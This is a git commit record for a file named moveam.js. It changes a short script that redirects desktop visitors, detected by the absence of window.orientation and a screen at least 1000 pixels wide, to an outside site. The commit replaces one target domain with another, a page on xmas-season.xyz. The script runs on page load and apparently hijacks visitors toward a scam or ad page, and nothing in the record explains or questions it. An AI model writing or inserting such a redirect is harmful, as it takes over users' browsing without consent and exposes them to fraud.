7f48108a6728a26052acb15217188ba8ba0df3e4
bigetijazz14 <bigetijazz14@gmail.com>
2024-11-30 04:31:34 -0800

    Update moveam.js

--- moveam.js
+++ moveam.js
@@ -1,5 +1,5 @@
 <script>
 if (typeof window.orientation == "undefined" && screen.width >= 1000){
-        window.location.href="http://outrotomr.com/4/3144603";
+        window.location.href="https://www.xmas-season.xyz/45000ETB.html";
 }
 </script>
